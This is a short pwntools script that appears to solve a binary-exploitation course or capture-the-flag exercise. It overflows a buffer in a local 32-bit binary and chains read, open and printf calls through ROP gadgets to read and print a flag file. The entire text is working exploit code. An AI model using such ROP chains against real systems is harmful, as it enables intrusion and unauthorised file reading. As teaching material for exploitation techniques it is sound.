#!/usr/bin/env python

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

p = process("./rop-4-32")
#p = process("./rop-4-3x")
#gdb.attach(p, "b *main")

addr_read = p32(0x080483c0)
addr_open = p32(0x08048400)
addr_printf = p32(0x080483d0)

bufloc = p32(0x804a800)

pop_pop_pop_ret = p32(0x08048739)
pop_pop_ret = p32(0x0804873a)
pop_ret = p32(0x080485c7)

buf = "A"*0x88 + "BBBB"

buf += addr_read + pop_pop_pop_ret + p32(0) + bufloc + p32(0x100)
buf += addr_printf + pop_ret + bufloc
buf += addr_open + pop_pop_ret + bufloc + p32(0)
buf += addr_read + pop_pop_pop_ret + p32(3) + bufloc + p32(0x100)
buf += addr_printf + pop_ret + bufloc

p.sendline(buf)

p.sendline("/home/users/jackson/week5/rop-4-32/flag\x00")

p.interactive()
